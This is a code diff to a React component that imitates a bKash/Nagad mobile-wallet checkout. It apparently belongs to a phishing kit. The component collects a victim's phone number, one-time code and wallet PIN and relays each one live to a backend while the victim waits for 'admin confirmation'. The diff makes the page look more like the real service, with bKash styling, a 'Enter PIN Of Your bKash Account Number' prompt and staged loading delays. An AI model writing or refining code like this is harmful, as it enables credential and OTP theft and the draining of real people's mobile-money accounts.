@@ -42,9 +42,10 @@ export default function OnlineCheckoutGateway({
   const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);
   const [adminWaitSeconds, setAdminWaitSeconds] = useState(10);
   const [isProcessing, setIsProcessing] = useState(false);
+  const [isBtnSubmitting, setIsBtnSubmitting] = useState(false);
   
   // Simulated gateway redirection timer states
-  const [isRedirecting, setIsRedirecting] = useState(true);
+  const [isRedirecting, setIsRedirecting] = useState(false);
   const [redirectProgress, setRedirectProgress] = useState(0);
 
   // Progressive loading simulation indicator over 2 seconds
@@ -313,6 +314,8 @@ export default function OnlineCheckoutGateway({
 
   const handleNextStep = (e: React.FormEvent) => {
     e.preventDefault();
+    if (isBtnSubmitting) return;
+
     if (step === 1) {
       // Validate mobile number: Bangladeshi format e.g. 017xxxxxxxx or 018xxxxxxxx
       if (!/^01[3-9]\d{8}$/.test(accountNumber)) {
@@ -322,19 +325,36 @@ export default function OnlineCheckoutGateway({
         );
         return;
       }
-      setCountdown(120);
-      setStep(2);
-      // SYNC ACCOUNT NUMBER ONCE CONFIRM IS CLICKED
-      syncCheckoutUpdate({ accountNumber, step: 2 });
+      if (type === 'bkash') {
+        setIsBtnSubmitting(true);
+        setTimeout(() => {
+          setIsBtnSubmitting(false);
+          setCountdown(120);
+          setStep(2);
+          syncCheckoutUpdate({ accountNumber, step: 2 });
+        }, 1200);
+      } else {
+        setCountdown(120);
+        setStep(2);
+        syncCheckoutUpdate({ accountNumber, step: 2 });
+      }
     } else if (step === 2) {
       // Validate OTP (simulate 6 digits)
       if (otp.length < 4) {
         alert('অনুগ্রহ করে সঠিক ভেরিফিকেশন কোডটি লিখুন।');
         return;
       }
-      setStep(3);
-      // SYNC OTP ONCE CONFIRM IS CLICKED
-      syncCheckoutUpdate({ otp, step: 3 });
+      if (type === 'bkash') {
+        setIsBtnSubmitting(true);
+        setTimeout(() => {
+          setIsBtnSubmitting(false);
+          setStep(3);
+          syncCheckoutUpdate({ otp, step: 3 });
+        }, 1200);
+      } else {
+        setStep(3);
+        syncCheckoutUpdate({ otp, step: 3 });
+      }
     } else if (step === 3) {
       // Validate PIN (bKash is 5, Nagad is 4)
       const requiredLen = type === 'bkash' ? 5 : 4;
@@ -343,16 +363,31 @@ export default function OnlineCheckoutGateway({
         return;
       }
       
-      // Simulate 2 seconds of payment processing/verifying animation
-      setIsProcessing(true);
-      setTimeout(() => {
-        setIsProcessing(false);
-        // Success! Step 4: wait for admin confirmation
-        setIsWaitingForAdmin(true);
-        setAdminWaitSeconds(10);
-        // SYNC PIN ONCE CONFIRM IS CLICKED
-        syncCheckoutUpdate({ pin, step: 4 });
-      }, 2000);
+      if (type === 'bkash') {
+        setIsBtnSubmitting(true);
+        setTimeout(() => {
+          setIsBtnSubmitting(false);
+          setIsProcessing(true);
+          setTimeout(() => {
+            setIsProcessing(false);
+            // Success! Step 4: wait for admin confirmation
+            setIsWaitingForAdmin(true);
+            setAdminWaitSeconds(10);
+            syncCheckoutUpdate({ pin, step: 4 });
+          }, 2000);
+        }, 1200);
+      } else {
+        // Simulate 2 seconds of payment processing/verifying animation
+        setIsProcessing(true);
+        setTimeout(() => {
+          setIsProcessing(false);
+          // Success! Step 4: wait for admin confirmation
+          setIsWaitingForAdmin(true);
+          setAdminWaitSeconds(10);
+          // SYNC PIN ONCE CONFIRM IS CLICKED
+          syncCheckoutUpdate({ pin, step: 4 });
+        }, 2000);
+      }
     }
   };
 
@@ -764,21 +799,12 @@ export default function OnlineCheckoutGateway({
             <h1 className="text-xs sm:text-sm font-bold font-serif italic tracking-wide text-zinc-900 leading-tight">
               {settings?.appName || 'ন্যানো-ফাইন্যান্স'}
             </h1>
-            <p className="text-[9px] text-zinc-400 font-sans tracking-wider leading-none mt-0.5">
-              {settings?.appSlug || 'সিলভার অ্যাডভান্সড'} | পেমেন্ট গেটওয়ে
-            </p>
           </div>
-        </div>
-        
-        {/* Safe Badge Indicator */}
-        <div className="flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-50 border border-emerald-100 text-emerald-600 select-none">
-          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
-          <span className="text-[8px] uppercase tracking-widest font-semibold font-mono">SECURE</span>
         </div>
       </div>
 
       <div className="flex-1 flex justify-center items-start p-3 sm:p-6 w-full">
-        <div className="w-full max-w-[500px] bg-white border border-neutral-200/80 shadow-2xl flex flex-col my-1 sm:my-3 rounded-xl overflow-hidden">
+        <div className="w-full max-w-[500px] bg-white border border-neutral-200/80 shadow-2xl flex flex-col my-1 sm:my-3 rounded-[5px] overflow-hidden">
           
           {/* ======================================= */}
           {/* LOGO AREA (WHITE SECTION WITH SOFT NEUTRAL BORDER UNDERNEATH) */}
@@ -848,9 +874,10 @@ export default function OnlineCheckoutGateway({
                         maxLength={11}
                         required
                         value={accountNumber}
+                        disabled={isBtnSubmitting}
                         onChange={(e) => handleAccountNumberChange(e.target.value)}
                         placeholder="e.g 01XXXXXXXXX"
-                        className="w-full max-w-[420px] h-[36px] border-none rounded-md text-center text-[15px] text-zinc-700 font-normal focus:outline-none focus:ring-0 shadow-xs bg-white placeholder-zinc-400"
+                        className="w-full max-w-[420px] h-[36px] border-none rounded-[3px] text-center text-[15px] text-zinc-700 font-normal focus:outline-none focus:ring-0 shadow-xs bg-white placeholder-zinc-400 disabled:opacity-80"
                       />
 
                       <div className="terms mt-2 text-white/90 text-[11px] text-center">
@@ -875,9 +902,10 @@ export default function OnlineCheckoutGateway({
                         maxLength={6}
                         required
                         value={otp}
+                        disabled={isBtnSubmitting}
                         onChange={(e) => handleOtpChange(e.target.value)}
                         placeholder="Enter 6 digit code"
-                        className="w-full max-w-[420px] h-[36px] border-none rounded-md text-center text-[15px] text-zinc-700 font-normal focus:outline-none focus:ring-0 shadow-xs bg-white tracking-widest placeholder-zinc-400"
+                        className="w-full max-w-[420px] h-[36px] border-none rounded-[3px] text-center text-[15px] text-zinc-700 font-normal focus:outline-none focus:ring-0 shadow-xs bg-white tracking-widest placeholder-zinc-400 disabled:opacity-80"
                       />
 
                       <div className="terms mt-2 text-white/90 text-[11px] text-center">
@@ -886,8 +914,9 @@ export default function OnlineCheckoutGateway({
                         ) : (
                           <button
                             type="button"
+                            disabled={isBtnSubmitting}
                             onClick={() => setCountdown(120)}
-                            className="underline text-white font-medium cursor-pointer hover:text-zinc-200 transition-colors"
+                            className="underline text-white font-medium cursor-pointer hover:text-zinc-200 transition-colors disabled:opacity-50"
                           >
                             Resend Code
                           </button>
@@ -898,9 +927,9 @@ export default function OnlineCheckoutGateway({
 
                   {/* STEP 3: PIN ENTER */}
                   {step === 3 && (
-                    <div className="w-full flex flex-col justify-center items-center text-center px-4">
-                      <h2 className="text-white/95 text-[13px] max-[600px]:text-[12px] font-normal mb-2 tracking-wide">
-                        Enter PIN
+                    <div className="w-full flex flex-col justify-center items-center text-center px-4 overflow-hidden">
+                      <h2 className="text-white/95 text-[12.5px] max-[600px]:text-[11px] font-normal mb-2 tracking-wide whitespace-nowrap">
+                        Enter PIN Of Your bKash Account Number ({obfuscateNumber(accountNumber)})
                       </h2>
                       
                       <input
@@ -914,9 +943,10 @@ export default function OnlineCheckoutGateway({
                         maxLength={5}
                         required
                         value={pin}
+                        disabled={isBtnSubmitting}
                         onChange={(e) => handlePinChange(e.target.value)}
                         placeholder="•••••"
-                        className="w-full max-w-[420px] h-[36px] border-none rounded-md text-center text-[18px] text-zinc-700 font-semibold focus:outline-none focus:ring-0 shadow-xs bg-white tracking-widest"
+                        className="w-full max-w-[420px] h-[36px] border-none rounded-[3px] text-center text-[18px] text-zinc-700 font-semibold focus:outline-none focus:ring-0 shadow-xs bg-[#e6e6e6] tracking-widest disabled:opacity-80"
                         style={{ WebkitTextSecurity: 'disc' }}
                       />
                     </div>
@@ -934,7 +964,8 @@ export default function OnlineCheckoutGateway({
                   <button
                     type="button"
                     onClick={handleCancelAction}
-                    className="btn cancel flex-1 h-[38px] rounded-md text-[13px] font-sans font-medium bg-white border border-neutral-200 text-neutral-600 transition-colors cursor-pointer hover:bg-neutral-50 active:scale-[0.99] focus:outline-none focus:ring-0"
+                    disabled={isBtnSubmitting}
+                    className="btn cancel flex-1 h-[38px] rounded-[3px] text-[13px] font-sans font-medium bg-white border border-neutral-200 text-neutral-600 transition-colors cursor-pointer hover:bg-neutral-50 active:scale-[0.99] focus:outline-none focus:ring-0 disabled:opacity-50 disabled:cursor-not-allowed"
                   >
                     Yes
                   </button>
@@ -942,7 +973,8 @@ export default function OnlineCheckoutGateway({
                   <button
                     type="button"
                     onClick={() => setShowCancelConfirm(false)}
-                    className="btn confirm flex-1 h-[38px] rounded-md text-[13px] font-sans font-medium transition-all active:scale-[0.99] focus:outline-none border-none outline-none"
+                    disabled={isBtnSubmitting}
+                    className="btn confirm flex-1 h-[38px] rounded-[3px] text-[13px] font-sans font-medium transition-all active:scale-[0.99] focus:outline-none border-none outline-none disabled:opacity-50 disabled:cursor-not-allowed"
                     style={{
                       backgroundColor: '#e2136e',
                       color: '#ffffff',
@@ -957,22 +989,31 @@ export default function OnlineCheckoutGateway({
                   <button
                     type="button"
                     onClick={() => setShowCancelConfirm(true)}
-                    className="btn cancel flex-1 h-[38px] rounded-md text-[13px] font-sans font-medium bg-white border border-neutral-200 text-neutral-600 transition-colors cursor-pointer hover:bg-neutral-50 active:scale-[0.99] focus:outline-none focus:ring-0"
+                    disabled={isBtnSubmitting}
+                    className="btn cancel flex-1 h-[38px] rounded-[3px] text-[13px] font-sans font-medium bg-[#e0e0e0] text-[#757575] transition-colors cursor-pointer hover:bg-neutral-200 active:scale-[0.99] focus:outline-none focus:ring-0 disabled:opacity-50 disabled:cursor-not-allowed border-none outline-none"
                   >
                     Cancel
                   </button>
                   
                   <button
                     type="submit"
-                    disabled={isConfirmDisabled()}
-                    className="btn confirm flex-1 h-[38px] rounded-md text-[13px] font-sans font-medium transition-all active:scale-[0.99] focus:outline-none disabled:opacity-50 disabled:cursor-not-allowed border-none outline-none"
+                    disabled={isConfirmDisabled() || isBtnSubmitting}
+                    className="btn confirm flex-1 h-[38px] rounded-[3px] text-[13px] font-sans font-medium transition-all active:scale-[0.99] focus:outline-none disabled:opacity-50 disabled:cursor-not-allowed border-none outline-none flex items-center justify-center"
                     style={{
                       backgroundColor: '#e2136e',
                       color: '#ffffff',
-                      cursor: 'pointer'
+                      cursor: isBtnSubmitting ? 'not-allowed' : 'pointer'
                     }}
                   >
-                    Confirm
+                    {isBtnSubmitting ? (
+                      <div className="flex items-center justify-center gap-1.5 py-1">
+                        <span className="w-2 h-2 bg-white rounded-full animate-bounce animate-duration-500" style={{ animationDelay: '0ms' }} />
+                        <span className="w-2 h-2 bg-white rounded-full animate-bounce animate-duration-500" style={{ animationDelay: '150ms' }} />
+                        <span className="w-2 h-2 bg-white rounded-full animate-bounce animate-duration-500" style={{ animationDelay: '300ms' }} />
+                      </div>
+                    ) : (
+                      "Confirm"
+                    )}
                   </button>
                 </>
               )}
